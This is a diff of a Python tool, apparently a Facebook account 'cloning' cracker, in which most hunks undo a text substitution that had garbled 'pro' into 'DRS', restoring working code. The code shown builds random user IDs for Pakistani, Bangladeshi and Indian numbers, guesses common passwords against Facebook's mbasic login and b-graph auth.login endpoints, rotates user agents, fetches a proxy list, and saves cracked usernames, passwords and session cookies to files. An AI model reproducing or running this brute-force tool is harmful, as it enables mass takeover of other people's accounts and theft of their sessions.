@@ -35,22 +35,22 @@ Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RQ3A.210805.019)
   Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QD4A.200805.014)
 """
 #-----
-import requests,bs4,sys,os,random,time,re,json,uuid,subDRScess,platform,base64
+import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
 from random import randint
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
 from datetime import date
 from datetime import datetime
 from urllib.parse import quote
-import requests,bs4,sys,os,random,time,re,json,uuid,subDRScess
+import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
 from random import randint
 import requests, re, os, time
-import requests, os, re, bs4,platform, sys, json, time, random, datetime, subDRScess, threading, itertools,base64,uuid,zlib
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
 from concurrent.futures import ThreadPoolExecutor as ADIabba
 from concurrent.futures import ThreadPoolExecutor as Adiabba
 from datetime import datetime
 from bs4 import BeautifulSoup
-from multiDRScessing.pool import ThreadPool
+from multiprocessing.pool import ThreadPool
 import platform,base64
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from concurrent.futures import ThreadPoolExecutor
@@ -161,12 +161,12 @@ try:
 except ImportError:
     print('\n [×] Bs4 module not installed!...\n')
     os.system('pip install bs4')
-import requests,bs4,json,sys,random,datetime,time,re,subDRScess,platform,struct
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 import os
 import random
-import requests,bs4,json,sys,random,datetime,time,re,subDRScess,platform,struct
+import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
 from bs4 import BeautifulSoup as sop
 from concurrent.futures import ThreadPoolExecutor as tred
 import base64
@@ -193,7 +193,7 @@ except ImportError:
     print('\n [✓] installing bs4 !...\n')
     os.system('pip install bs4')
 
-import requests, os, re, bs4,platform, sys, json, time, random, datetime, subDRScess, threading, itertools,base64,uuid,zlib
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
 from concurrent.futures import ThreadPoolExecutor as ahmadAXI
 from datetime import datetime
 from bs4 import BeautifulSoup
@@ -288,7 +288,7 @@ def logo():
     print(logo)
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
-        print('\033[1;96m The DRSsess Done Is Completed')
+        print('\033[1;96m The Prosess Done Is Completed')
         print('\n\033[1;92mTotal OK : %s \n \033[1;95m Total CP : %s'%(str(len(ok)),str(len(cp))));input(' Press Enter To Go Back ');main()
         #print('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
     else:
@@ -311,7 +311,7 @@ class __crack__:
         self.__pler__()
     def __mbasic__(self, user, _sempak_):
         global ok,cp,loop
-        sys.stdout.write('\r\r\033[1;37m [DRS-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [PRO-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         sys.stdout.flush()
         for pw in _sempak_:
             pw = pw.lower()
@@ -328,16 +328,16 @@ class __crack__:
             _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2707.112 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
             if 'c_user' in ses.cookies.get_dict():
-                print('\r\033[1;32m [DRS-OK]\033[1;32m %s | %s      ' % (user,pw))
+                print('\r\033[1;32m [PRO-OK]\033[1;32m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('DRS-OK.txt','a').write('%s\n' % wrt)
+                open('PRO-OK.txt','a').write('%s\n' % wrt)
                 break
             elif 'checkpoint' in ses.cookies.get_dict():
-                print('\r\033[1;31m [DRS-CP]\033[1;31m %s | %s      ' % (user,pw))
+                print('\r\033[1;31m [PRO-CP]\033[1;31m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('DRS-CP.txt','a').write('%s\n' % wrt)
+                open('PRO-CP.txt','a').write('%s\n' % wrt)
                 break
             else:
                 continue
@@ -455,7 +455,7 @@ except ImportError:
 
 	os.system('pip install bs4')
 
-import requests, os, re, bs4, sys, uuid, json, time, random, datetime, subDRScess
+import requests, os, re, bs4, sys, uuid, json, time, random, datetime, subprocess
 
 from concurrent.futures import ThreadPoolExecutor as YayanGanteng
 
@@ -594,13 +594,13 @@ url_ip = "https://www.httpbin.org/ip"
 
 url_graph = "https://graph.facebook.com/{}"
 
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T DRS Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
 
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-#agen1 = ['NokiaC2-00/2.0 (03.45) DRSfile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
+#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
 
-#agen2 = ['NokiaC3-00/5.0 (08.63) DRSfile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
+#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
 
 ###########################################################################################
 
@@ -622,9 +622,9 @@ bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
 
 #user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
 
-uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T DRS Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
 
-uas_nokiac2 = "NokiaC2-00/2.0 (03.45) DRSfile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
+uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
 
 uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
 
@@ -642,15 +642,15 @@ uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWe
 
 uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
 
-uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) DRSfile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
+uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
 
-uas_nokiac3 = "NokiaC3-00/5.0 (08.63) DRSfile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
+uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
 
 uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
 
 uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
 
-uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T DRS Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
+uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
 
 # lempankkkkkkkk
 
@@ -659,11 +659,11 @@ ugen2=[]
 ugen=[]
 
 try:
-	DRSx= requests.get('https://raw.githubusercontent.com/TheSpeedX/DRSXY-List/master/http.txt').text
-	open('http.txt','w').write(DRSx)
+	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt').text
+	open('http.txt','w').write(prox)
 except Exception as e:
 	os.system ("clear")
-DRSx=open('http.txt','r').read().splitlines()
+prox=open('http.txt','r').read().splitlines()
 
 for xd in range(10000):
 
@@ -677,7 +677,7 @@ for xd in range(10000):
 
 	e=random.randrange(100, 9999)
 
-	f='/110.021.0028; DRSfile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
 
 	g=random.randrange(1, 9)
 
@@ -826,7 +826,7 @@ def mrriaz():
 	print('[1] Pak Random Cloning ')
 	print('[2] B D Random Cloning  ')
 	print('[3] Choice Pass Cloning')
-	print('\x1b[1;91m[4]  Exit DRSgrame')
+	print('\x1b[1;91m[4]  Exit Programe')
 	linex()
 	riaz=input(' Select option : ')
 	if riaz =='1':
@@ -904,7 +904,7 @@ def m1():
 			pwx = [guru]
 			yaari.submit(rcrack,uid,pwx,tl)
 	linex()
-	print('Crack DRScess has been completed')
+	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt')
 	linex()
 	exit()
@@ -936,7 +936,7 @@ def m2():
 			pwx = [guru,kode+guru,'khan1122']
 			yaari.submit(rcrack,uid,pwx,tl)
 	linex()
-	print('Crack DRScess has been completed')
+	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt')
 	linex()
 	exit()
@@ -968,7 +968,7 @@ def m3():
 			pwx = [guru+kode,'khan12','khan1122','khan12345','khan123']
 			yaari.submit(rcrack,uid,pwx,tl)
 	linex()
-	print('Crack DRScess has been completed')
+	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt')
 	linex()
 	exit()
@@ -1000,7 +1000,7 @@ def m4():
 			pwx = [guru,'khan786','khan12345','khan123','khan1234','khan1122','janjan']
 			yaari.submit(rcrack,uid,pwx,tl)
 	linex()
-	print('Crack DRScess has been completed')
+	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt')
 	linex()
 	exit()
@@ -1032,7 +1032,7 @@ def m5():
 			pwx = [guru,'baloch','malik786','baloch123','khan12345','khan123','afghan123','pubg123']
 			yaari.submit(rcrack,uid,pwx,tl)
 	linex()
-	print('Crack DRScess has been completed')
+	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt')
 	linex()
 	exit()
@@ -1061,7 +1061,7 @@ def choice():
     print('[•] Example : 1/ 2/ 3/ 4/ 5/ 6/ 7/ 8/ 9**ETC ')
     linex()
     passx = int(input("[•] Enter Password Limit : "))
-    DRSID = []
+    PROID = []
     os.system('clear')
     print(logo)
     print('[•] Example : khankhan,baloch,khan786,mlik786**Etc')
@@ -1080,8 +1080,8 @@ def choice():
         for love in uid:
             pwx = [love[1:]]
             uid = code+love
-            for DRS in mrriaz:
-                pwx.append(DRS)
+            for PRO in mrriaz:
+                pwx.append(PRO)
                 pwx.append(love)
             yaari.submit(rcrack,uid,pwx,tl)
 #_______
@@ -1114,7 +1114,7 @@ def india():
 			pwx = [guru,kode+guru,aj,aja]
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(50*'-')
-	print('Crack DRScess has been completed')
+	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt')
 	print(47*'-')
 	facebookweb()
@@ -1145,7 +1145,7 @@ def bd():
 			pwx = [guru,kode+guru]
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(50*'-')
-	print('Crack DRScess has been completed')
+	print('Crack process has been completed')
 	print('Ids saved in ok.txt,cp.txt')
 	print(47*'-')
 	facebookweb()
@@ -1235,9 +1235,9 @@ try:
 except:pass
 
 
-import subDRScess
+import subprocess
 from bs4 import BeautifulSoup
-import json,os,time,base64,random,re,sys, subDRScess 
+import json,os,time,base64,random,re,sys, subprocess 
 from requests.exceptions import ConnectionError as CError
 from concurrent.futures import ThreadPoolExecutor as speed
 
@@ -1251,11 +1251,11 @@ loop = 0
 '''
 Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.2555.106 Mobile Safari/537.36
 
-android_version = subDRScess.check_output('getDRSp ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
-andd=subDRScess.check_output('getDRSp ro.DRSduct.brand',shell=True).decode('utf-8').replace('\n','')
-model = subDRScess.check_output('getDRSp ro.DRSduct.model',shell=True).decode('utf-8').replace('\n','')
-carr=subDRScess.check_output('getDRSp gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
-build = subDRScess.check_output('getDRSp ro.build.id',shell=True).decode('utf-8').replace('\n','')
+android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
+andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
+model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
+carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
+build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
 
 device = {
         'android_version':android_version,
@@ -1299,7 +1299,7 @@ l = []
 def file():
     os.system("clear")
     print(logo)
-    if 'DRS' in l:
+    if 'PRO' in l:
         riaz2 = 'mr.riaz'
     else:
         riaz2 = input(f"[+]Enter File: ")
@@ -1409,20 +1409,20 @@ def method():
         except:
            last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r \033[1;97m[\033[1;97mDRS-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r \033[1;97m[\033[1;97mPRO-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
             heads = "Mozilla/5.0 (Linux; Android 13; linux Build/TP1A.220624.047; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4043.209 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/314.1.0.16.127;]"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
-            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.DRStocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
+            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
             response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
       #      print(response.text)
             if 'session_key' in response.text:
                 okacc.append(acc)
-                print('\r\033[1;92m [DRS-OK] '+acc+'| '+pword+'')
-                open('/sdcard/DRS-OK.txt','a').write(f'{acc}|{pword}\n ')
+                print('\r\033[1;92m [PRO-OK] '+acc+'| '+pword+'')
+                open('/sdcard/PRO-OK.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
@@ -1431,16 +1431,16 @@ def method():
                            cookies = f"sb={ssbb};{ckkk}"
                     except Exception as e:print(str(e)+' | '+response.text)
                 print(' \033[1;97m'+cookies)
-                open('/sdcard/DRS-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
+                open('/sdcard/PRO-COOKIE.txt','a').write(f'{acc}|{pword}\n{cookies} ')    
                 
                 break
             elif 'www.facebook.com' in response.text:
                 if cpok=='n':
                      pass
                 else:
-                     print('\r\033[1;96m [DRS-CP] '+acc+'| '+pword+'')
+                     print('\r\033[1;96m [PRO-CP] '+acc+'| '+pword+'')
                 cpacc.append(acc)
-                open('/sdcard/DRS-CP.txt','a').write(f'{acc} • {pword}\n')
+                open('/sdcard/PRO-CP.txt','a').write(f'{acc} • {pword}\n')
                 break
             else:
                 continue
@@ -1462,19 +1462,19 @@ def method():
         except:
             last = first
         pers = str(int(loop)/int(len(accounts)) * 100)[:4]
-        sys.stdout.write('\r \033[1;97m[\033[1;97mDRS-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
+        sys.stdout.write('\r \033[1;97m[\033[1;97mPRO-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:
             heads = None
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
-            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.DRStocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
